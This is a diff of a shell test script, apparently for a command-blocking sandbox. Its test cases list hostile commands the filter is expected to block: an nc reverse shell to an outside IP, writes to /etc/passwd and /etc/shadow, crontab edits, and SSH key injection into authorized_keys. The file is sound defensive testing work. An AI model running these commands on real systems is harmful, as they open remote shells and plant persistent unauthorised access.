@@ -68,7 +68,7 @@ expect_blocked "nc reverse shell" 'nc 10.0.0.1 4444 -e /bin/bash'
 expect_blocked "crontab -e"       'crontab -e'
 expect_blocked "write /etc/passwd" 'echo x > /etc/passwd'
 expect_blocked "write /etc/shadow" 'echo x > /etc/shadow'
-expect_blocked "ssh key inject other" 'echo key > /home/bentlegen/.ssh/authorized_keys'
+expect_blocked "ssh key inject other" 'echo key > /home/admin_user/.ssh/authorized_keys'
 expect_blocked "ssh key inject root"  'echo key > /root/.ssh/authorized_keys'
 
 echo ""
